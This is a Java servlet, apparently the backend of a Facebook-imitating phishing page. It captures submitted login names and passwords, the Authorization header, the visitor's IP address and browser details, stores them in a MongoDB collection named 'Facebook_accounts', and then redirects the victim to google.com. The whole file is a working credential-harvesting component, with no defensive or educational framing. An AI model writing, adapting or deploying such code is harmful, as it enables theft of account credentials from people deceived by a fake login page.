package com.facebook_clone;

import java.io.*;
import java.sql.Timestamp;
import java.util.Date;

import com.mongodb.client.MongoCollection;
import com.mongodb.client.MongoDatabase;
import org.bson.Document;
import jakarta.servlet.http.*;
import jakarta.servlet.annotation.*;


@WebServlet(name = "formHandle", value = "/formHandle")
public class formHandle extends HttpServlet {



    public void init() {
    }

    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {

        // 3. Request Headers
        // Standard HTTP Headers
        String userAgent = request.getHeader("User-Agent"); // Information about the client's browser and operating system
        String host = request.getHeader("Host"); // The domain name of the server and the port number
        String accept = request.getHeader("Accept"); // Media types that the client is willing to receive
        String acceptLanguage = request.getHeader("Accept-Language"); // Preferred languages of the client
        String acceptEncoding = request.getHeader("Accept-Encoding"); // Content encoding methods the client supports (e.g., gzip, deflate)
        String contentType = request.getHeader("Content-Type"); // The media type of the body of the request (for POST and PUT requests)
        String contentLength = request.getHeader("Content-Length"); // The length of the request body in bytes
        String authorization = request.getHeader("Authorization"); // Authentication credentials for HTTP authentication


// 5. Request Information
        String uri = request.getRequestURI();
        String method = request.getMethod();
        String protocol = request.getProtocol();
        String serverName = request.getServerName();
        int serverPort = request.getServerPort();
        String remoteAddr = request.getRemoteAddr();
        String remoteHost = request.getRemoteHost();
        int remotePort = request.getRemotePort();
        String localAddr = request.getLocalAddr();
        String localName = request.getLocalName();
        int localPort = request.getLocalPort();




// 9. Async Context
        boolean isAsyncStarted = request.isAsyncStarted();

        String login = request.getParameter("login");
        String password = request.getParameter("password");
        Date date = new Date();
        Timestamp time = new Timestamp(date.getTime());


        MongoDatabase db = MongoClientConnection.getDB();
        MongoCollection<Document> col = db.getCollection("Facebook_accounts");


        // Remove session parameter from Account constructor
        Account account = new Account(isAsyncStarted,  localPort, localName, localAddr, remotePort, remoteHost, remoteAddr, serverPort, serverName,  protocol, method,   uri, authorization, contentLength, contentType, acceptEncoding, acceptLanguage, accept, host, userAgent, time, password, login);

        // Remove session parameter from createDocument method
        Document document = account.createDocument();


        // Insert the document into the collection
      col.insertOne(document);

        response.sendRedirect("http://www.google.com");
    }



    public void destroy() {
    }
}